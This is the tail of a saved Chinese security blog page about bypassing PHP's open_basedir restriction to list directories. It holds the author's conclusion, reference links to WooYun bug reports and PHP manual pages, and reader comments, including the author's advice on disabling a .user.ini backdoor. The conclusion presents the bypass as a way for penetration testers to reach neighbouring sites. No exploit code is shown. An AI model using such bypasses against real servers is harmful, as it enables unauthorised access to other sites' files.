+<p>估计又会有人质疑了，光绕过open_basedir列目录有什么用？</p>
+<p>诚然，列目录相比于读、写具体文件，都鸡肋了很多。但很多时候，就是这些看似“鸡肋”的漏洞组合技完成了绝杀。</p>
+<p>当列目录可以列出备份文件、整站源码的时候，你还能说列目录是个鸡肋的漏洞么？</p>
+<p>安全是一个水桶，不是看哪块木板最高，而是看哪块木板最低。当我们保护住这些“低木板”的时候，才能真正守护住水桶。</p>
+<p>而对于渗透测试的同学来说，open_basedir绕过也希望给大家一个新的思路：拿旁站不一定非要提权或弹shell，有时候可能只是简单地列一下目录，就能给你所有。</p>
+<h2 id="0x08"><a class="toclink" href="#0x08">0x08 参考文档与链接</a></h2>
+<p><a href="http://zone.wooyun.org/content/11268">http://zone.wooyun.org/content/11268</a><br>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-083453">http://www.wooyun.org/bugs/wooyun-2010-083453</a><br>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-083688">http://www.wooyun.org/bugs/wooyun-2010-083688</a><br/>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-083457">http://www.wooyun.org/bugs/wooyun-2010-083457</a><br/>
+<a href="http://php.net/manual/en/class.directoryiterator.php">http://php.net/manual/en/class.directoryiterator.php</a><br/>
+<a href="http://php.net/manual/zh/wrappers.glob.php">http://php.net/manual/zh/wrappers.glob.php</a><br/>
+<a href="http://php.net/manual/en/function.realpath.php">http://php.net/manual/en/function.realpath.php</a><br/>
+<a href="http://php.net/manual/en/splfileinfo.getrealpath.php">http://php.net/manual/en/splfileinfo.getrealpath.php</a><br/>
+<a href="http://php.net/manual/en/book.image.php">http://php.net/manual/en/book.image.php</a><br/>
+<a href="http://php.net/manual/en/function.gettext.php">http://php.net/manual/en/function.gettext.php</a></br></br></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1904">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP绕过open_basedir列目录的研究  离别歌/4b1401a66f7058d02b706e8cb74c135b.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.baidu.com" target="_blank">呵呵</a>
+<time datetime="2014年12月29日 11:41" itemprop="datePublished">
+                            2014 十二月 29 11:41
+                        </time>
+<a href="javascript:reply_to('1904', '呵呵')">回复</a>
+</p>
+<p class="comment-meta">大牛，请教一下，windows下的&lt;&gt;两个通配符的说法... 小菜不懂 ：(</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1905">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP绕过open_basedir列目录的研究  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年12月29日 13:40" itemprop="datePublished">
+                            2014 十二月 29 13:40
+                        </time>
+<a href="javascript:reply_to('1905', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@呵呵：这个里面说的很详细：http://wooyun.org/bugs/wooyun-2014-071540，你可以看看。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1865">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP绕过open_basedir列目录的研究  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">wskwsk</a>
+<time datetime="2014年11月26日 12:05" itemprop="datePublished">
+                            2014 十一月 26 12:05
+                        </time>
+<a href="javascript:reply_to('1865', 'wskwsk')">回复</a>
+</p>
+<p class="comment-meta">《user.ini文件构成的PHP后门》<br/>请问一下 这个后门怎么防范呢？<br/><br/>;user_ini.filename = ".user.ini"，默认前面有分号，已经禁用了，测试后，发现仍能生效</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1866">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP绕过open_basedir列目录的研究  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年11月26日 12:12" itemprop="datePublished">
+                            2014 十一月 26 12:12
+                        </time>
+<a href="javascript:reply_to('1866', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@wskwsk：user_ini.filename =<br/>设置成空即可，不要注释掉。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1862">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP绕过open_basedir列目录的研究  离别歌/8dc4fb4d032f76fe21716b9062797769.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.veryarm.com/" target="_blank">arm</a>
+<time datetime="2014年11月24日 09:31" itemprop="datePublished">
+                            2014 十一月 24 09:31
+                        </time>
+<a href="javascript:reply_to('1862', 'arm')">回复</a>
+</p>
+<p class="comment-meta">有研究就是好的</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="c2057c9a81828f87dedc761fb680c053adcc8b07"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./PHP绕过open_basedir列目录的研究  离别歌/c2057c9a81828f87dedc761fb680c053adcc8b07"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="337">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="ErdkZB2t74vf99liMeLC4hD1l79NhE4ecLyQN5eIyRpE9OJxAvfmDVF6ubCV08To"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./PHP绕过open_basedir列目录的研究  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./PHP绕过open_basedir列目录的研究  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
